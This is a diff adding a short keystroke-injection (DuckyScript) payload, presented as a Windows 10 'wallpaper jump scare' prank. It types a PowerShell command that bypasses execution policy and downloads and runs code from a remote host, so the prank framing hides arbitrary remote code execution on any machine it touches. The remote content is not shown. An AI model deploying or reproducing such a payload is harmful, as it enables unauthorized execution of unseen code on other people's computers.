@@ -1,0 +1,13 @@
+REM Title: beigeworm's Wallpaper Jump Scare.
+REM Author: @beigeworm
+REM Description: This script changes downlaods a scary image and sets it as a wallpaper.
+REM Target: Windows 10
+
+REM open powershell
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -Ep Bypass -C iex (irm bw0.cc/wpjmp)
+ENTER
+
+
